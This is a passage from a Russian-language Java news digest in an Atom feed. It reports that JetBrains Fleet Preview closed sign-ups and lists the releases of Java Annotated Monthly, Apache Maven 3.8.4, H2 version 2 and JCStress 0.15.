&lt;p&gt;В данный момент Fleet недоступен широкому кругу пользователей, и работает программа Fleet Preview, в которой, однако, &lt;a href="https://twitter.com/JetBrains_Fleet/status/1466705214761840643"&gt;закончился приём заявок &lt;/a&gt; из-за большого наплыва желающих протестировать новую IDE.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел выпуск &lt;a href="https://blog.jetbrains.com/idea/2021/12/java-annotated-monthly-december-2021/"&gt;Java Annotated Monthly&lt;/a&gt; от JetBrains за декабрь 2021.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://maven.apache.org/docs/3.8.4/release-notes.html"&gt;Apache Maven 3.8.4&lt;/a&gt;.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышла &lt;a href="http://www.h2database.com/html/changelog.html"&gt;вторая версия&lt;/a&gt; H2, популярной SQL СУБД, написанной полностью на Java. Это произошло спустя 16 лет после выхода первой версии.&lt;/p&gt;

&lt;p class="pt-2"&gt;&amp;bull; Вышел &lt;a href="https://mail.openjdk.org/pipermail/jcstress-dev/2021-December/000965.html"&gt;JCStress 0.15&lt;/a&gt;.&lt;/p&gt;</content>
  </entry>
</feed>
